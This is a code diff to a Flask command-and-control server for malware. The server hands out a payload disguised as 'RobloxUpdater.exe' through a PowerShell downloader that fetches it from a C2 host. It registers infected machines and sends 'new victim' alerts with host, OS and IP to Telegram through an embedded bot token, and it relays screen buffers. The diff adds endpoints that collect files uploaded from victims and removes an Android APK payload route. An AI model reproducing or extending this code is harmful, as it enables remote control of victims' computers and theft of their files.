@@ -6,9 +6,7 @@ import urllib.request
 app = Flask(__name__)
 PAYLOAD_EXE = "RobloxUpdater.exe"
 PAYLOAD_PS1 = "payload.ps1"
-PAYLOAD_APK = "NexusAndroid.apk"
 
-# ====== TELEGRAM УВЕДОМЛЕНИЯ ======
 TG_TOKEN = "8455099643:AAHBCduZGysWOaqks9pQT_U-riBBaCl8f5E"
 TG_CHAT  = "7065893630"
 
@@ -21,12 +19,43 @@ def tg_notify(text):
         urllib.request.urlopen(req, timeout=10)
     except Exception:
         pass
-# ===================================
 
 lock = threading.Lock()
 clients = {}
 screen_buffers = {}
 screen_lock = threading.Lock()
+
+# ====== FALLBACK: приём файлов ======
+uploads = {}
+uploads_lock = threading.Lock()
+
+@app.route("/upload/<cid>", methods=["POST"])
+def upload_file(cid):
+    fname = request.headers.get("X-Filename", "file.bin")
+    data = request.get_data()
+    if not data:
+        return jsonify({"status": "empty"}), 400
+    with uploads_lock:
+        uploads[f"{cid}__{fname}"] = data
+    print(f"[U] {cid}/{fname} ({len(data)} bytes)")
+    return jsonify({"status": "ok", "size": len(data)})
+
+@app.route("/file/<cid>/<fname>")
+def get_file(cid, fname):
+    key = f"{cid}__{fname}"
+    with uploads_lock:
+        if key not in uploads:
+            return "not found", 404
+        data = uploads[key]
+    return Response(data, mimetype="application/octet-stream",
+                    headers={"Content-Disposition": f"attachment; filename={fname}"})
+
+@app.route("/files/<cid>")
+def list_files(cid):
+    with uploads_lock:
+        keys = [k for k in uploads.keys() if k.startswith(cid + "__")]
+    return jsonify({"files": [{"name": k.split("__", 1)[1], "size": len(uploads[k])} for k in keys]})
+# ==================================
 
 def log_hit(ip, ua, endpoint):
     try:
@@ -53,17 +82,8 @@ def raw_exe():
     log_hit(request.remote_addr, request.headers.get("User-Agent",""), "/raw_exe")
     return send_file(PAYLOAD_EXE, mimetype="application/octet-stream")
 
-@app.route("/android")
-def android_download():
-    log_hit(request.remote_addr, request.headers.get("User-Agent",""), "/android")
-    try:
-        return send_file(PAYLOAD_APK, mimetype="application/vnd.android.package-archive")
-    except Exception:
-        return "APK not uploaded yet", 404
-
 @app.route("/run.ps1")
 def run_ps1():
-    log_hit(request.remote_addr, request.headers.get("User-Agent",""), "/run.ps1")
     ps = (
         '$u = "https://nexus-hub-c2.onrender.com/raw_exe"\n'
         '$o = "$env:TEMP\\RobloxUpdater.exe"\n'
@@ -89,7 +109,7 @@ def register():
             "results": [],
         }
     print(f"[+] register {cid} | {hostname} | {request.remote_addr}")
-    tg_notify(f"🎯 НОВАЯ ЖЕРТВА\nID: {cid}\nHost: {hostname}\nOS: {os_info}\nIP: {request.remote_addr}\nВремя: {datetime.datetime.now().strftime('%H:%M:%S')}")
+    tg_notify(f"🎯 НОВАЯ ЖЕРТВА\nID: {cid}\nHost: {hostname}\nOS: {os_info}\nIP: {request.remote_addr}\n{datetime.datetime.now().strftime('%H:%M:%S')}")
     return jsonify({"cid": cid})
 
 @app.route("/poll", methods=["POST"])
